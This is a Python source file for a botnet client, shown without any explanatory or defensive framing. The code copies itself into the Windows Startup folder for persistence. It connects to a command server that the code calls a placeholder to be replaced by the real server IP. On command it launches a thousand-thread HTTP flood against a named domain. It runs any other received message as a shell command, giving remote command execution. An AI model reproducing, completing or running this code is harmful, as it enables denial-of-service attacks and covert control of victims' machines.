import socket, random, time, threading, os, sys
from shutil import copyfile
backslash = ' \ '
backslash = backslash.strip()
def get_filename():
    cwd = sys.argv[0]
    cwd = list(cwd)
    result = ""
    for i in cwd:
        if i == "/" or i == backslash:
            result = result + " "
        else:
            result = result + i
    result = result.split()
    final_result = result[(len(result) -  1)]
    return final_result
user = os.getlogin()
try:
    copyfile(f'{get_filename()}',f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{get_filename()}')
except:
    pass
sent = 0
request_sent = 0
port = 80
ip = 'peepeepoopoo.com'
ip = socket.gethostbyname(ip)
time.sleep(1)
thread_num_mutex = threading.Lock()
def printstatus():
    global fake_ip
    random_num1 = str(random.randint(0, 255))
    random_num2 = str(random.randint(0, 255))
    random_num3 = str(random.randint(0, 255))
    random_num4 = str(random.randint(0, 255))
    fake_ip = f'{random_num1}.{random_num2}.{random_num3}.{random_num4}'
    thread_num_mutex.acquire(True)
    thread_num_mutex.release()
def ddos():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            printstatus()
            sock.connect((ip, port))
            sock.send(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'))
            sock.send(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'))
        except:
            pass
threads = []
conn_ip = socket.gethostbyname(socket.gethostname()) #<---- this is for testing purposes. Change the IP to the server ip for later use.
port = 80
commands = ['!ddos','!botcount','!listcon', '!shutdownAll']
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((conn_ip, port))
        break
    except:
        s.close()
        pass
while True:
    try:
        message = s.recv(1024).decode()
        if message == "!ddos":
            for i in range(1000):
                x = threading.Thread(target=ddos)
                x.start()
                threads.append(x)
            for currentthread in threads:
                currentthread.join()
        elif message in commands:
            pass
        else:
            os.system(message)
    except:
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((conn_ip, port))
                break
            except:
                s.close()
                pass
